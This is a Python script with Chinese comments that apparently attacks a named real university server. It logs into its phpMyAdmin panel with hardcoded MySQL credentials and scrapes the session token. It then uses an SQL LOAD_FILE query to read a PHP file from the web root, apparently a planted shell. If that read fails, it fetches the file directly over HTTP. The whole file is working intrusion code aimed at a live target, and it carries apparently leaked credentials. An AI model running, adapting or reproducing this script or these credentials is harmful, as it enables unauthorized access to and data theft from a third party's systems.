#!/usr/bin/env python3
import requests
import re
import urllib3
from html import unescape
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)

# 获取token
token_match = re.search(r'token=([a-f0-9]+)', resp.text)
if not token_match:
    print("[-] 获取token失败")
    exit(1)
token = token_match.group(1)

# 读取文件
file_path = "/var/www/html/banpot/scmeeting/x.php"
print(f"[*] 读取文件: {file_path}")

sql_data = {"sql_query": f"SELECT LOAD_FILE('{file_path}');", "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)

# 提取文件内容
content_match = re.search(r'<td[^>]*class="value"[^>]*>(.*?)</td>', resp.text, re.DOTALL)
if content_match:
    content = unescape(content_match.group(1))
    content = re.sub(r'<[^>]+>', '', content)
    print("\n[+] 文件内容:")
    print("=" * 60)
    print(content)
    print("=" * 60)
else:
    print("[-] 未找到文件内容，尝试其他方法...")
    # 尝试查找所有包含PHP代码的部分
    php_matches = re.findall(r'(&lt;\?php.*?&gt;|&lt;\?.*?&gt;)', resp.text, re.DOTALL)
    if php_matches:
        print("\n[+] 找到PHP代码片段:")
        for match in php_matches[:5]:
            print(unescape(match))
    
    # 尝试直接访问
    print("\n[*] 尝试直接HTTP访问...")
    test_url = "https://olympic.su.ac.th/banpot/scmeeting/x.php"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if test_resp.status_code == 200:
        print(test_resp.text[:500])
    else:
        print(f"HTTP {test_resp.status_code}")
